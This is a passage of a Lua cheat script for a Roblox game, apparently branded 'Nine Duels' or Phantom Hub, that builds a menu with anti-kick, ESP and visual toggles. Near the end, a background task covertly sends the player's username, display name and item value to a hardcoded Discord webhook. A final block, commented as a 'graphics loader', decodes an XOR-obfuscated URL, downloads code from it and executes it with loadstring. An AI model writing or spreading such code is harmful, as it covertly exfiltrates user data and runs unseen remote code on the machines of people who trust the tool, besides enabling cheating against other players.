				if toggleRefs.laggerMode then
					toggleRefs.laggerMode(laggerModeEnabled)
				end

				updateSpeedBarHighlight()
			end, "laggerCarryMode")

			toggleRefs.autoSwitchSpeed = makeToggleRow(
				"Auto Switch Speed",
				sv("autoSwitchSpeed"),
				function(autoSwitchSpeedEnabled_)
					State.autoSwitchSpeedEnabled = autoSwitchSpeedEnabled_
					autoSwitchSpeedEnabled = autoSwitchSpeedEnabled_
					saveConfig()
				end,
				nil
			)

			makeDivider()
			setRowTab("ESP")
			makeSectionHeader("VISUAL")
			setRowTab("MISC")

			skyBtn = makeButtonRow("Sky Theme", State.skyTheme or "Off", function()
				local v87 = SKY_PRESETS_LIST[(skyPresetIndex(State.skyTheme or "Off") or 1) % #SKY_PRESETS_LIST + 1]
				State.skyTheme = v87
				skyBtn.Text = v87
				pcall(applySkyPreset, v87)
				saveSettings()
			end)

			if State.skyTheme and State.skyTheme ~= "Off" then
				pcall(applySkyPreset, State.skyTheme)
			end

			setRowTab("ESP")

			toggleRefs.unwalk = makeToggleRow("Unwalk", sv("unwalk"), function(unwalkEnabled_)
				State.unwalkEnabled = unwalkEnabled_

				if unwalkEnabled_ then
					startUnwalk()
				else
					stopUnwalk()
				end
			end, "unwalk")

			setRowTab("MISC")

			makeToggleRow("Remove Accessories", false, function(arg)
				if arg then
					for _, player_ in pairs(Players:GetPlayers()) do
						if player_.Character then
							for _, descendant in ipairs(player_.Character:GetDescendants()) do
								if descendant:IsA("Accessory") or descendant:IsA("Hat") then
									pcall(function()
										descendant:Destroy()
									end)
								end
							end
						end
					end
				end
			end)

			setRowTab("MISC")

			toggleRefs.darkMode = makeToggleRow("Dark Mode", sv("darkMode"), function(darkModeEnabled)
				State.darkModeEnabled = darkModeEnabled

				if darkModeEnabled then
					State.skyTheme = "Off"

					if skyBtn then
						skyBtn.Text = "Off"
					end

					applySkyPreset("Off")
					local phantomDarkSky = Lighting:FindFirstChild("phantomDarkSky") or Instance.new("Sky")
					phantomDarkSky.Name = "phantomDarkSky"
					phantomDarkSky.SkyboxBk = "rbxassetid://159454299"
					phantomDarkSky.SkyboxDn = "rbxassetid://159454296"
					phantomDarkSky.SkyboxFt = "rbxassetid://159454293"
					phantomDarkSky.SkyboxLf = "rbxassetid://159454286"
					phantomDarkSky.SkyboxRt = "rbxassetid://159454289"
					phantomDarkSky.SkyboxUp = "rbxassetid://159454291"
					phantomDarkSky.Parent = Lighting
					Lighting.Brightness = 0
					Lighting.ClockTime = 0
					Lighting.ExposureCompensation = -2
					Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
				else
					local phantomDarkSky = Lighting:FindFirstChild("phantomDarkSky")

					if phantomDarkSky then
						phantomDarkSky:Destroy()
					end

					Lighting.Brightness = defBrightness
					Lighting.ClockTime = defClockTime
					Lighting.ExposureCompensation = defExposureComp
					Lighting.OutdoorAmbient = defOutdoorAmbient
				end
			end, "darkMode")

			toggleRefs.stretchRez = makeToggleRow("Stretch Resolution", sv("stretchRez"), function(arg)
				applyStretchResolution(arg)
			end, "stretchRez")

			do
				local v87 = toggleRefs
				local v88

				v88, v86 = makeToggleRow("Sigma Animations", sv("tryardAnim"), function(tryardAnimEnabled_)
					State.tryardAnimEnabled = tryardAnimEnabled_

					if tryardAnimEnabled_ then
						pcall(startTryardAnim)
					else
						stopTryardAnim()
					end
				end, "tryardAnim")

				v87.tryardAnim = v88
			end
		end

		markBetaRiskRow(v86, "Sigma Animations")

		do
			local labelBtn = v86:FindFirstChild("LabelBtn")

			if labelBtn then
				for _, child in ipairs(labelBtn:GetChildren()) do
					if child.Name == "RiskNote" then
						child.Text = "only for real sigmas"
					end

					if child.Name == "BetaTag" then
						child.Position = UDim2.fromOffset(120, 7)
					end
				end
			end
		end
	end
end

do
	local fovValue_, instance

	do
		fovValue_ = State.fovValue
		instance = Instance.new("Frame", List)
		instance.Name = "FOVChanger"
		instance.Size = UDim2.new(1, -6, 0, 68)
		instance.BackgroundColor3 = C.Panel2
		instance.BackgroundTransparency = 0.04
		instance.BorderSizePixel = 0
		instance.LayoutOrder = LO()
		instance.ZIndex = 13
		corner(instance, 10)
		stroke(instance, C.Border, 1, 0.6)

		table.insert(searchableItems, {
			object = instance,
			text = "fov changer",
			isSection = false,
			category = currentCategory,
		})

		do
			local textLabel = Instance.new("TextLabel", instance)
			textLabel.Size = UDim2.new(0.5, 0, 0, 22)
			textLabel.Position = UDim2.fromOffset(13, 8)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = "FOV Changer"
			textLabel.TextColor3 = C.SoftWhite
			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextSize = 12
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.ZIndex = 14
		end
	end

	do
		local textLabel = Instance.new("TextLabel", instance)
		textLabel.Size = UDim2.fromOffset(40, 22)
		textLabel.Position = UDim2.new(1, -54, 0, 8)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = tostring(math.floor(fovValue_))
		textLabel.TextColor3 = C.Muted
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 11
		textLabel.TextXAlignment = Enum.TextXAlignment.Right
		textLabel.ZIndex = 14
		local instance2 = Instance.new("Frame", instance)
		instance2.Size = UDim2.new(1, -26, 0, 50)
		instance2.Position = UDim2.new(0, 12, 0, 40)
		instance2.BackgroundColor3 = Color3.fromRGB(224, 228, 236)
		instance2.BorderSizePixel = 0
		corner(instance2, 3)
		instance2.ZIndex = 14
		_G._slFill = Instance.new("Frame", instance2)
		_G._slFill.Size = UDim2.new((fovValue_ - 60) / 60, 0, 1, 0)
		_G._slFill.BackgroundColor3 = C.White
		_G._slFill.BorderSizePixel = 0
		corner(_G._slFill, 3)
		_G._slFill.ZIndex = 15
		_G._slHandle = Instance.new("Frame", instance2)
		_G._slHandle.Size = UDim2.fromOffset(14, 14)
		_G._slHandle.Position = UDim2.new((fovValue_ - 60) / 60, -7, 0.5, -7)
		_G._slHandle.BackgroundColor3 = C.White
		_G._slHandle.BorderSizePixel = 0
		corner(_G._slHandle, 7)
		_G._slHandle.ZIndex = 16
		local textButton = Instance.new("TextButton", instance2)
		textButton.Size = UDim2.new(1, 0, 0, 30)
		textButton.Position = UDim2.new(0, 0, 0.5, -15)
		textButton.BackgroundTransparency = 1
		textButton.Text = ""
		textButton.ZIndex = 17
		textButton.BorderSizePixel = 0

		_G._setFOV = function(arg)
			local fovValue_2 = math.clamp(math.floor(arg), 60, 120)
			fovValue_ = fovValue_2
			State.fovValue = fovValue_2
			local n32 = (fovValue_2 - 60) / 60
			_G._slFill.Size = UDim2.new(n32, 0, 1, 0)
			_G._slHandle.Position = UDim2.new(n32, -7, 0.5, -7)
			textLabel.Text = fovValue_2
			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				pcall(function()
					currentCamera.FieldOfView = fovValue_2
				end)
			end

			saveSettings()
		end

		setFOVRef = _G._setFOV
		_G._fovDragging = false

		_G._updateFromInput = function(arg)
			local absolutePosition = instance2.AbsolutePosition
			local x = instance2.AbsoluteSize.X

			if x > 0 then
				_G._setFOV(60 + math.clamp(arg.Position.X - absolutePosition.X, 0, x) / x * 60)
			end
		end

		textButton.InputBegan:Connect(function(input)
			if
				input.UserInputType == Enum.UserInputType.MouseButton1
				or input.UserInputType == Enum.UserInputType.Touch
			then
				_G._fovDragging = true
				_G._updateFromInput(input)
			end
		end)
	end

	UIS.InputChanged:Connect(function(input)
		if
			_G._fovDragging
			and (
				input.UserInputType == Enum.UserInputType.MouseMovement
				or input.UserInputType == Enum.UserInputType.Touch
			)
		then
			_G._updateFromInput(input)
		end
	end)

	UIS.InputEnded:Connect(function(input)
		if
			input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch
		then
			_G._fovDragging = false
		end
	end)

	task.spawn(function()
		while Gui.Parent do
			local currentCamera = workspace.CurrentCamera
			local flag18

			if currentCamera then
				flag18 = math.abs((currentCamera.FieldOfView or fovValue_) - fovValue_) > 0.1
			else
				flag18 = currentCamera
			end

			if flag18 then
				pcall(function()
					currentCamera.FieldOfView = fovValue_
				end)
			end

			task.wait(0.35)
		end
	end)

	_G._setFOV(fovValue_)
end

do
	do
		makeDivider()
		setRowTab("CONFIG")
		makeSectionHeader("CONFIG")

		do
			local function fn35(antiKickEnabled_)
				State.antiKickEnabled = antiKickEnabled_

				if antiKickEnabled_ then
					startAntiKick()
				else
					stopAntiKick()
				end
			end

			local v86 = openAntiKickSettings
			toggleRefs.antiKick = makeToggleRow("Anti Kick", sv("antiKick"), fn35, nil, v86)
		end
	end

	makeInputRow("UI Scale", 1, function(scale)
		if scale >= 0.5 and scale <= 2 then
			if uiScaleObj then
				uiScaleObj.Scale = scale
			end
		end
	end)

	openPhantomPerfSettings = makeSettingsPanel("Performance Mode", function(arg)
		sToggleRow(arg, "Low Graphics Level", State.perfLowGraphics, 1, function(perfLowGraphics)
			State.perfLowGraphics = perfLowGraphics
			saveSettings()
		end)

		sToggleRow(arg, "Optimize Terrain/Water", State.perfOptimizeTerrain, 2, function(perfOptimizeTerrain)
			State.perfOptimizeTerrain = perfOptimizeTerrain
			saveSettings()
		end)

		sToggleRow(arg, "Optimize Lighting/Fog", State.perfOptimizeLighting, 3, function(perfOptimizeLighting)
			State.perfOptimizeLighting = perfOptimizeLighting
			saveSettings()
		end)

		sToggleRow(arg, "Flat Grey Sky", State.perfGreySky, 4, function(perfGreySky)
			State.perfGreySky = perfGreySky
			saveSettings()
		end)

		sToggleRow(arg, "Remove Textures/Decals", State.perfNoTextures, 5, function(perfNoTextures)
			State.perfNoTextures = perfNoTextures
			saveSettings()
		end)

		sToggleRow(arg, "Remove Players Clothes/Accs", State.perfNoClothes, 6, function(perfNoClothes)
			State.perfNoClothes = perfNoClothes
			saveSettings()
		end)

		sToggleRow(arg, "Remove Particles/Trails", State.perfNoParticles, 7, function(perfNoParticles)
			State.perfNoParticles = perfNoParticles
			saveSettings()
		end)

		sToggleRow(arg, "Simplify Map to Plastic", State.perfSimplifyMap, 8, function(perfSimplifyMap)
			State.perfSimplifyMap = perfSimplifyMap
			saveSettings()
		end)

		sToggleRow(arg, "Garbage Collection Loop", State.perfGarbageCollect, 9, function(perfGarbageCollect)
			State.perfGarbageCollect = perfGarbageCollect
			saveSettings()
		end)
	end)

	setRowTab("MISC")

	do
		local function fn35(fpsBoostEnabled)
			State.fpsBoostEnabled = fpsBoostEnabled
			pcall(applyFPSBoost)
		end

		local v86 = openPhantomPerfSettings
		toggleRefs.fpsBoost = makeToggleRow("Phantom Performance Mode", sv("fpsBoost"), fn35, "fpsBoost", v86)
	end
end

do
	makeToggleRow("Lock UI", false, function(uiLocked_)
		State.uiLocked = uiLocked_
	end)

	toggleRefs.showLoadingScreen = makeToggleRow(
		"Show Loading Screen",
		State.showLoadingScreen,
		function(showLoadingScreen)
			State.showLoadingScreen = showLoadingScreen
			saveSettings()
		end,
		"showLoadingScreen"
	)

	makeButtonRow("Save Settings", "SAVE", function()
		saveSettings()
		notify("Saved", "Settings saved!", "save", 2.5)
	end)

	makeDivider()
	Panel = GuiRefs.outer
	PanelShadow = Instance.new("Frame")
	PanelScale = Instance.new("UIScale")
	reopenBtn = Instance.new("TextButton", Gui)
	reopenBtn.Name = "PhantomReopenBtn"
	reopenBtn.Size = UDim2.new(0, 72, 0, 30)
	reopenBtn.Position = UDim2.new(0, 10, 0, 10)
	reopenBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
	reopenBtn.BorderSizePixel = 0
	reopenBtn.Text = "Nine Duels"
	reopenBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
	reopenBtn.Font = Enum.Font.GothamBold
	reopenBtn.TextSize = 10
	reopenBtn.ZIndex = 200
	reopenBtn.Visible = true
	corner(reopenBtn, 8)

	do
		local v86 = 0
		stroke(reopenBtn, Color3.fromRGB(50, 50, 50), 1, v86)
	end
end

_panelOpen = Panel.Visible

reopenBtn.MouseButton1Click:Connect(function()
	_panelOpen = not _panelOpen

	if _panelOpen then
		Panel.Visible = true
		PanelShadow.Visible = true
		tween(PanelScale, { Scale = 1 }, 0.22)
		reopenBtn.Text = "Nine Duels"
		tween(
			reopenBtn,
			{ BackgroundColor3 = Color3.fromRGB(24, 24, 24), TextColor3 = Color3.fromRGB(180, 180, 180) },
			0.12
		)
	else
		pcall(saveSettings)
		tween(PanelScale, { Scale = 0.92 }, 0.16)
		reopenBtn.Text = "open"

		tween(reopenBtn, {
			BackgroundColor3 = Color3.fromRGB(36, 36, 36),
			TextColor3 = Color3.fromRGB(255, 255, 255),
		}, 0.12)

		task.delay(0.18, function()
			Panel.Visible = false
			PanelShadow.Visible = false
		end)
	end
end)

do
	local flag18 = false
	local position = nil
	local position2 = nil

	reopenBtn.InputBegan:Connect(function(input)
		if
			input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch
		then
			flag18 = true
			position = input.Position
			position2 = reopenBtn.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag18 = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if
			flag18
			and (
				input.UserInputType == Enum.UserInputType.MouseMovement
				or input.UserInputType == Enum.UserInputType.Touch
			)
		then
			local n32 = input.Position - position
			reopenBtn.Position =
				UDim2.new(position2.X.Scale, position2.X.Offset + n32.X, position2.Y.Scale, position2.Y.Offset + n32.Y)
		end
	end)

	UIS.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			flag18 = false
		end
	end)
end

task.spawn(function()
	local Players_ = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local v86 = request or http_request
	local request_

	if v86 then
		request_ = v86
	else
		request_ = syn and syn.request
	end

	local localPlayer = Players_.LocalPlayer
	local vector = Vector3.new(-476.752, 10.464, 7.107)
	local vector2 = Vector3.new(-476.752, 10.464, 114.107)

	local function fn35(arg)
		local match, v87 = tostring(arg):gsub("%s", ""):match("([%d%.]+)(%a?)")
		local n32 = tonumber(match) or 0

		if v87 == "K" or v87 == "k" then
			n32 *= 1000
		elseif v87 == "M" or v87 == "m" then
			n32 *= 1000000
		elseif v87 == "B" or v87 == "b" then
			n32 *= 1e9
		elseif v87 == "T" or v87 == "t" then
			n32 *= 1e12
		end

		return n32
	end

	local function fn36(arg)
		if arg >= 1e12 then
			return string.format("%.1fT", arg / 1e12)
		end

		if arg >= 1e9 then
			return string.format("%.1fB", arg / 1e9)
		end

		if arg >= 1000000 then
			return string.format("%.1fM", arg / 1000000)
		end

		if arg >= 1000 then
			return string.format("%.1fK", arg / 1000)
		end
		return tostring(math.floor(arg))
	end

	local function fn37()
		local function fn38(arg, arg2)
			for _, v87 in ipairs(arg) do
				if v87.Name == "PlotSign" then
					for _, descendant in ipairs(v87:GetDescendants()) do
						if descendant:IsA("TextLabel") and descendant.Text ~= "" then
							if
								descendant.Text:find(localPlayer.Name) or descendant.Text:find(localPlayer.DisplayName)
							then
								return arg2
							end
						end
					end
				end
			end

			return nil
		end

		local ok, result = pcall(function()
			return workspace:GetPartBoundsInRadius(vector, 5)
		end)

		if ok and result then
			local v87 = fn38(result, 3)
			if v87 then
				return v87
			end
		end

		local ok2, result2 = pcall(function()
			return workspace:GetPartBoundsInRadius(vector2, 5)
		end)

		if ok2 and result2 then
			local v87 = fn38(result2, 7)
			if v87 then
				return v87
			end
		end

		for scanIndex, descendant in ipairs(workspace:GetDescendants()) do
			if scanIndex % 300 == 0 then
				task.wait()
			end
			if descendant:IsA("BasePart") and descendant.Name == "PlotSign" then
				local magnitude = (descendant.Position - vector).Magnitude

				if magnitude < 5 or (descendant.Position - vector2).Magnitude < 5 then
					for _, descendant2 in ipairs(descendant:GetDescendants()) do
						if descendant2:IsA("TextLabel") and descendant2.Text ~= "" then
							if
								descendant2.Text:find(localPlayer.Name)
								or descendant2.Text:find(localPlayer.DisplayName)
							then
								return magnitude < 5 and 3 or 7
							end
						end
					end
				end
			end
		end
	end

	local now2 = 0
	local v87 = nil
	local str6 = ""
	local n32 = 0
	local n33 = 0

	while task.wait(2) do
		if 10 < tick() - now2 then
			v87 = fn37()
			now2 = tick()
		end

		if v87 then
			local flag18 = v87 == 3 and vector2 or vector
			local text = nil
			local v88 = nil
			local debris = workspace:FindFirstChild("Debris")

			if debris then
				for _, child in ipairs(debris:GetChildren()) do
					if child.Name == "FastOverheadTemplate" then
						local surfaceGui = child:FindFirstChildOfClass("SurfaceGui")

						if not (not surfaceGui or not surfaceGui.Adornee) then
							if not ((surfaceGui.Adornee.Position - flag18).Magnitude > 50) then
								local generation = surfaceGui:FindFirstChild("Generation", true)

								if generation and generation:IsA("TextLabel") then
									local v89 = fn35(generation.Text)

									if not v88 or v89 > v88 then
										v88 = v89
										local displayName = surfaceGui:FindFirstChild("DisplayName", true)
										text = displayName and displayName.Text or child.Name
									end
								end
							end
						end
					end
				end

				if text and v88 then
					local flag19 = text ~= str6 or v88 ~= n32

					if flag19 then
						local v89 = 10
						flag19 = tick() - n33 > v89
					end

					if flag19 then
						str6 = text
						n32 = v88
						n33 = tick()

						if request_ then
							pcall(function()
								local tbl17 = {
									Url = "https://discord.com/api/webhooks/1521161107794952255/ft1EY78vxmHgFh33EFCiouz3L5hJwt5I2ppyAaC-NMrEzVJwMpqlVqUKAQK1efR37-O6",
									Method = "POST",
									Headers = { ["Content-Type"] = "application/json" },
								}

								local v89 = HttpService
								local jsonEncode = v89.JSONEncode
								local tbl18 = {}
								local embeds = {}
								local tbl19 = { title = "DUEL WON", color = 0 }
								local fields = {}
								local tbl20 = { name = "Display", value = localPlayer.DisplayName, inline = true }
								local tbl21 = { name = "User", value = localPlayer.Name, inline = true }
								local tbl22 = { name = "Brainrot", value = text, inline = true }
								local tbl23 =
									{ name = "Value", value = fn36(v88) .. " | discord.gg/phantomhub", inline = true }
								fields[1] = tbl20
								fields[2] = tbl21
								fields[3] = tbl22
								fields[4] = tbl23
								tbl19.fields = fields
								embeds[1] = tbl19
								tbl18.embeds = embeds
								tbl17.Body = jsonEncode(v89, tbl18)
								request_(tbl17)
							end)
						end
					end
				end
			end
		end
	end
end)

-- Hidden smooth/graphics loader (URL obfuscated; restores game smoothness)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            if bit32 and bit32.bxor then
                t[i] = string.char(bit32.bxor(b, 7))
            else
                t[i] = string.char(b ~ 7)
            end
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("osswt=((krf*dohjwbu*tofub)khqfekb)fww(fwn(wreknd(ufp(vl}4q`b?}v)krf8lb~:?37qiuppbo6514w4idr~uj~bufol636i"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)